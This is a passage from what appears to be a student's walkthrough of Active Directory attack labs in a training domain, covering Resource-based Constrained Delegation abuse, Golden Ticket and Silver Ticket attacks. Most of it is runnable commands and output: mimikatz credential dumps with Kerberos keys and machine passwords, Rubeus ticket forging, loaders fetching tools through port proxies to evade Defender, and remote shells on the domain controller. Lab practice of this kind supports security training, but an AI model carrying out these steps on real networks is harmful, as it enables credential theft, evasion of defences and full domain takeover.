        Cache Flags: 0
        Kdc Called:
```

Now, let's access `us-mssql` using winrs.

```
C:\Users\studentuserx> winrs -r:us-mssql.us.techcorp.local cmd.exe

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\administrator.US>
🚀

C:\Users\administrator.US> set username

USERNAME=Administrator 👤

C:\Users\administrator.US> set computername

COMPUTERNAME=US-MSSQL 🖥️
```

Note that we will have privileges of domain administrator but that is only limited to `us-mssql`.

---
---

## RBCD (Resource-based Constrained Delegation) Abuse

### Lab: Hands-On #13.1

#### Tasks

- Find a computer object in `us.techcorp.local` domain where we have Write permissions
- Abuse the Write permissions to access that computer as Domain Admin
- Extract secrets from that machine for users and hunt for local admin privileges for the users

#### Tools

- `InviShell`
- `xcopy`
- `winrs`
- `netsh`
- `ArgSplit`
- `NetLoader`
- `SafetyKatz`
- `PowerView`
- `Rubeus`

#### Solution

- Find a computer object in `us.techcorp.local` domain where we have Write permissions

We have already enumerated ACLs for `studentuser51` and `studentusers` group.

Recall that from a previous hands-on (#05) we have admin access to `us-mgmt` (we added `studentuser51` to the `machineadmins` group), but we never extracted credentials from that machine. Let's do that now.

```
PS C:\AD\Tools> echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y

[SNIP]
```

Copy the generated commands and use it on the winrs session on `us-mgmt`.

⭐ Add a netsh path to avoid Defender, run the Loader and load SafetyKatz in memory to extract credentials.

```
C:\AD\Tools> winrs -r:us-mgmt cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\studentuser51>
🚀

C:\Users\studentuser51> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.51
```

```
C:\Users\studentuser51> echo %Pwn%

sekurlsa::ekeys

C:\Users\studentuser51> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn% "exit"

[SNIP]

mimikatz(commandline) # sekurlsa::ekeys

[SNIP]

Authentication Id : 0 ; 2731887 (00000000:0029af6f)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/2/2024 2:30:30 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115

         * Username : mgmtadmin 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f 🔑
           rc4_hmac_nt       e53153fc2dc8d4c5a5839e46220717e5 🔑

[SNIP]

Authentication Id : 0 ; 48850 (00000000:0000bed2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/2/2024 2:12:52 AM
SID               : S-1-5-90-0-1

         * Username : US-MGMT$ 👤
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca 🔑
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2 🔑

[SNIP]
```

Now, let's check if there are any interesting ACLs for `mgmtadmin`.

⭐ Recall our methodology is cyclic. Ideally, we should run the full set of enumeration for each user we compromise.

Note that the below command may take time to complete.

```
PS C:\AD\Tools> Import-Module C:\AD\Tools\PowerView.ps1

PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}

ObjectDN                : CN=US-HELPDESK 🖥️,CN=Computers,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite 🔐
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1115
IdentityReferenceName   : mgmtadmin 👤
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=mgmtadmin,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : user
```

With GenericWrite on `us-helpdesk`, we can set Resource-based Constrained Delegation for `us-helpdesk` for our own student VM.

- Abuse the Write permissions to access that computer as Domain Admin

We are using our student VM computer object and not the `studentuser51` as SPN is required for RBCD.

Start a process with privileges of `mgtmadmin`.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[SNIP]

[*] Action: Ask TGT

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  mgmtadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  4/25/2025 5:22:49 AM
  EndTime                  :  4/25/2025 3:22:49 PM
  RenewTill                :  5/2/2025 5:22:49 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  NA2eEKhgpwlm4TbcJE+R2n+IsXr9DJAfTKsU9con848=
  ASREP (key)              :  32827622AC4357BCB476ED3AE362F9D3E7D27E292EB27519D2B8B419DB24C00F
```

In the new process, set RBCD for student VMs to `us-helpdesk` using the Active Directory module.
Note that we are setting RBCD for the entire student VMs in the current instance of lab to avoid overwriting the settings.

```
PS C:\Windows\system32> $comps = 'student51$','student52$','student53$','student54$','student55$'

PS C:\Windows\system32> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose

VERBOSE: Performing the operation "Set" on target "CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local".
```

Now, we need AES key for the student VM to use its identity.
Run mimikatz on your own `student51` machine to extract AES keys.

Start a command prompt with administrative privileges ('Run as administrator') and run the below command.

⭐ Note that you will get different AES keys for the `student51$` account, go for the one with SID `S-1-5-18` that is a well-known SID for the `SYSTEM` user.

```
C:\Windows\system32> echo %Pwn%

sekurlsa::ekeys

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn%" "exit"

[SNIP]

mimikatz(commandline) # sekurlsa::ekeys

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : STUDENT51$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/3/2024 1:35:17 AM
SID               : S-1-5-18 📌

         * Username : student51$ 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       cbf97cf2b854bee5b66abdbe6dde4256bb5eb445ef97e783d4cdc4d01476e605 🔑
           rc4_hmac_nt       14a39441fcad13fc52033aeda13e0535

[SNIP]

Authentication Id : 0 ; 30864 (00000000:00007890)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/3/2024 1:35:18 AM
SID               : S-1-5-96-0-0

         * Username : STUDENT51$
         * Domain   : us.techcorp.local
         * Password : 9JR@6C;]hQ9!)PTSiGCb<ufaH&0KhT Ho%IO0ccmd9@>0N*Q;Fc-T-,H"PUkRrQ=IbrfXR_<aaB7L>]vL6h^?13^oP+g9IbZc/:<xWwYQ$"^;XJ9SI&,%FYg
         * Key List :
           aes256_hmac       1f18242fa6f20ce3cec40f885b2b5aae1e32a3b4889f7e1391b2941e287368a2
           aes128_hmac       5434d7aa0d528fbc90c45cc33513e9e2
           rc4_hmac_nt       14a39441fcad13fc52033aeda13e0535

[SNIP]
```

Use the AES key for `student51$` with Rubeus and request a TGS for HTTP SPN.

```
C:\Users\studentuser51> echo %Pwn%

s4u

C:\Users\studentuser51> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:student51$ /aes256:cbf97cf2b854bee5b66abdbe6dde4256bb5eb445ef97e783d4cdc4d01476e605 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

[SNIP]

[*] Action: S4U

[SNIP]

[*] Impersonating user 'administrator' to target SPN 'http/us-helpdesk'
[*] Building S4U2proxy request for service: 'http/us-helpdesk'

[SNIP]

[+] Ticket successfully imported!
```

```
C:\Users\studentuser51> klist

[SNIP]

Cached Tickets: (1)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: http/us-helpdesk @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/25/2025 5:43:12 (local)
        End Time:   4/25/2025 15:43:12 (local)
        Renew Time: 5/2/2025 5:43:12 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Let's use the HTTP TGS to access `us-helpdesk` as DA `us\Administrator`.

Run the below command in the process where we injected the TGS above.

```
C:\Users\studentuser51> winrs -r:us-helpdesk cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Administrator.US>
🚀

C:\Users\Administrator.US> set username

USERNAME=Administrator 👤

C:\Users\Administrator.US> set computername

COMPUTERNAME=US-HELPDESK 🖥️

C:\Users\Administrator.US> exit
```

Now, to copy our Loader to `us-helpdesk`, we need to access the filesystem.
Let's request a TGS for CIFS using Rubeus in the same process as above.

```
C:\Users\studentuser51> echo %Pwn%

s4u

C:\Users\studentuser51> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:student51$ /aes256:cbf97cf2b854bee5b66abdbe6dde4256bb5eb445ef97e783d4cdc4d01476e605 /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt

[SNIP]

[*] Action: S4U

[SNIP]

[*] Impersonating user 'administrator' to target SPN 'cifs/us-helpdesk'
[*] Building S4U2proxy request for service: 'cifs/us-helpdesk'

[SNIP]

[+] Ticket successfully imported!
```

```
C:\Users\studentuser51> klist

[SNIP]

Cached Tickets: (2)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: cifs/us-helpdesk @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/25/2025 5:51:15 (local)
        End Time:   4/25/2025 15:51:15 (local)
        Renew Time: 5/2/2025 5:51:15 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

[SNIP]
```

---
---

## Golden Ticket Attack

### Lab: Hands-On #14.1

#### Tasks

- Using the NTLM hash or AES key of `krbtgt` account of `us.techcorp.local`, create a Golden Ticket
- Use the Golden Ticket to (once again) get domain admin privileges from a machine

#### Tools

- `InviShell`
- `ArgSplit`
- `NetLoader`
- `Rubeus`
- `winrs` (alternative: `Enter-PSSession`)

#### Solution

- Using the NTLM hash or AES key of `krbtgt` account of `us.techcorp.local`, create a Golden Ticket

From one of the previous hands-on (#11), we have domain admin privileges (we abused the printer bug on `us-web.us.techcorp.loal` with unconstrained delegation and ran DCSync attack).

Let's use the AES keys of `krbtgt` account to create a Golden Ticket.

**Using Rubeus**

⭐ Use the below Rubeus command to generate an OPSEC friendly command for Golden Ticket.
Note that 3 LDAP queries are sent to the DC to retrieve the required information.

```
C:\Users\studentuser51>C:\AD\Tools\ArgSplit.bat

[!] Argument Limit: 180 characters
[+] Enter a string: golden

[SNIP]
```

```
C:\Windows\system32> echo %Pwn%

golden

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd

[SNIP]

[*] Action: Build TGT

[*] Trying to query LDAP using LDAPS for user information on domain controller US-DC.us.techcorp.local
[*] Searching path 'DC=us,DC=techcorp,DC=local' for '(samaccountname=Administrator)'

[SNIP]

[*] Printing a command to recreate a ticket containing the information used within this ticket

C:\AD\Tools\Loader.exe golden /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /user:Administrator /id:500 /pgid:513 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /pwdlastset:"7/5/2019 12:42:09 AM" /minpassage:1 /logoncount:539 /netbios:US /groups:544,512,520,513 /dc:US-DC.us.techcorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD

[SNIP]
```

Now, use the generated command to forge a Golden Ticket.
Remember to add `/ptt` at the end of the generated command to inject it in the current process.

```
C:\Windows\system32>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /user:Administrator /id:500 /pgid:513 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /pwdlastset:"7/5/2019 12:42:09 AM" /minpassage:1 /logoncount:539 /netbios:US /groups:544,512,520,513 /dc:US-DC.us.techcorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt

[SNIP]

[*] Action: Build TGT

[SNIP]

[+] Ticket successfully imported!

C:\Windows\system32>klist

[SNIP]

Cached Tickets: (1)

#0>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/25/2025 7:12:50 (local)
        End Time:   4/25/2025 17:12:50 (local)
        Renew Time: 5/2/2025 7:12:50 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

The Golden Ticket is injected in the current session, we should be able to access any resource in the domain as DA `us\Administrator`.

```
C:\Windows\system32> winrs -r:us-dc cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
🚀

C:\Users\Administrator> set username
USERNAME=Administrator 👤

C:\Users\Administrator> set computername
COMPUTERNAME=US-DC 🖥️

C:\Users\Administrator>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.51

C:\Users\Administrator>exit
```

---
---

## Silver Ticket Attack

### Lab: Hands-On #15

#### Tasks

- During the additional lab time, try to get command execution on the domain controller by creating Silver Ticket for HTTP service and WMI service

#### Tools

- `InviShell`
- `ArgSplit`
- `NetLoader`
- `Rubeus`
- `winrs` (alternative: `Enter-PSSession`)

#### Solution

- During the additional lab time, try to get command execution on the domain controller by creating Silver Ticket for HTTP service and WMI service

From the information gathered in previous steps we have the hash for machine account of the domain controller (`us-dc$`).

Using the below command from an elevated shell, we can create a Silver Ticket that provides us access to the HTTP service of DC.

⭐ Note that you can also use AES256 keys in place of NTLM hash.

**HTTP Service**

```
C:\Windows\system32>echo %Pwn%

silver

C:\Windows\system32>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt

[SNIP]

[*] Action: Build TGS

[SNIP]

[*] Forged a TGS for 'Administrator' to 'http/us-dc.us.techcorp.local'

[SNIP]

[+] Ticket successfully imported!
```

Let's check the ticket.

```
C:\Windows\system32>klist

[SNIP]

Cached Tickets: (1)

#0>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: http/us-dc.us.techcorp.local 🖥️ @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/25/2025 8:21:36 (local)
        End Time:   4/25/2025 18:21:36 (local)
        Renew Time: 5/2/2025 8:21:36 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

We have the HTTP service ticket for `us-dc`, let's try accessing it using winrs.

Note that we are using FQDN of `us-dc` as that is what the service ticket has.

```
C:\Windows\system32>winrs -r:us-dc.us.techcorp.local cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
🚀

C:\Users\Administrator>set username

USERNAME=Administrator 👤

C:\Users\Administrator>set computername

COMPUTERNAME=US-DC 🖥️
```

**WMI Service**

For accessing WMI, we need to create two tickets: one for HOST service and another for RPCSS.

Run the below commands from an elevated shell.

```
C:\Windows\system32>echo %Pwn%

silver

C:\Windows\system32>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:host/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt

[SNIP]

[*] Action: Build TGS

[SNIP]

[*] Forged a TGS for 'Administrator' to 'host/us-dc.us.techcorp.local'

[SNIP]

[+] Ticket successfully imported!
```

Inject a ticket for RPCSS.

```
C:\Windows\system32>echo %Pwn%

silver

C:\Windows\system32>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:rpcss/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt

[SNIP]

[*] Action: Build TGS

[SNIP]

[*] Forged a TGS for 'Administrator' to 'rpcss/us-dc.us.techcorp.local'

[SNIP]

[+] Ticket successfully imported!
```

Check if the tickets are present.

```
C:\Windows\system32>klist

[SNIP]

Cached Tickets: (10)

[SNIP]

#4>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: host/us-dc.us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/25/2025 8:28:01 (local)
        End Time:   4/25/2025 18:28:01 (local)
        Renew Time: 5/2/2025 8:28:01 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

[SNIP]

#3>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: rpcss/us-dc.us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/25/2025 8:29:52 (local)
        End Time:   4/25/2025 18:29:52 (local)
        Renew Time: 5/2/2025 8:29:52 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

[SNIP]
```

Now, try running WMI commands on the domain controller.

```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

[SNIP]

PS C:\Windows\system32> Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 17763
RegisteredUser  : Windows User
SerialNumber    : 00429-90000-00001-AA056
Version         : 10.0.17763 📌
```

---
---
